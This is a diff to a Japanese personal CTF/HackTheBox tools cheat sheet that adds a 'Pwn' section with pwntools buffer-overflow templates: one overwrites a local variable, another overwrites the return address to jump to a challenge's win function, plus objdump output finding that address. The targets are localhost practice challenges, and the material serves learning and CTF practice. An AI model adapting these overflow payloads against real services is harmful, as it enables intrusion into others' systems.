@@ -1,7 +1,8 @@
 +++
 author = "Hugo Authors"
-title = "CTF&HTB Tools まとめ"
+title = "📌CTF&HTB Tools まとめ"
 date = "2025-11-11"
+weight = -2
 description = ""
 tags = [
     "CTF",
@@ -11,7 +12,7 @@ categories = [
     "Security",
     "Programming",
 ]
-image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
+image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/ctf/cover.png"
 +++
 
 CTFやHTBで利用できるツールを自分用にまとめておく．
@@ -78,6 +79,68 @@ for qr in qr_codes:
 問題例:  
 &emsp;- https://stark2420.github.io/starknote/post/new-year-ctf-2025/#broken-qr-100  
 &emsp;- https://stark2420.github.io/starknote/post/new-year-ctf-2025/#my-best-regards-100
+
+## Pwn
+
+<details><summary>install</summary>
+{{< code lang="" title="" hl_lines="" >}}
+# pwntoolsのインストール
+$ pip install pwntools
+
+# ROPgadgetのインストール
+$ pip install ROPgadget
+{{< /code >}}
+</details>
+
+### Buffer Overflow (BOF)
+#### ローカル変数の書き換え
+```
+from pwn import *
+
+io = remote("localhost", 9012)
+
+payload = b"A" * 24
+payload += p64(0xdeadbeef)
+
+io.sendline(payload)
+io.interactive()
+```
+#### リターンアドレスの書き替え
+```
+from pwn import *
+
+elf = ELF('./chall')
+win_addr = elf.symbols['win']
+
+io = remote("localhost", 9012)
+
+payload = b"A" * 18
+payload += p64(win_addr)
+
+io.sendafter(b"input:", payload)
+io.interactive()
+```
+手動でwin関数のアドレスを調べる場合は，以下のように`0x401186`とわかる．
+```
+$ objdump -d chall | grep "win" -A 16
+0000000000401186 <win>:
+  401186:       55                      push   %rbp
+  401187:       48 89 e5                mov    %rsp,%rbp
+  40118a:       48 83 ec 70             sub    $0x70,%rsp
+  40118e:       48 8d 05 6f 0e 00 00    lea    0xe6f(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
+  401195:       48 89 c6                mov    %rax,%rsi
+  401198:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 402006 <_IO_stdin_used+0x6>
+  40119f:       48 89 c7                mov    %rax,%rdi
+  4011a2:       e8 e9 fe ff ff          call   401090 <fopen@plt>
+  4011a7:       48 89 45 f8             mov    %rax,-0x8(%rbp)
+  4011ab:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
+  4011af:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4011b3:       be 64 00 00 00          mov    $0x64,%esi
+  4011b8:       48 89 c7                mov    %rax,%rdi
+  4011bb:       e8 b0 fe ff ff          call   401070 <fgets@plt>
+  4011c0:       48 8d 45 90             lea    -0x70(%rbp),%rax
+  4011c4:       48 89 c7                mov    %rax,%rdi
+```
 
 ## Web
 ### FFUF
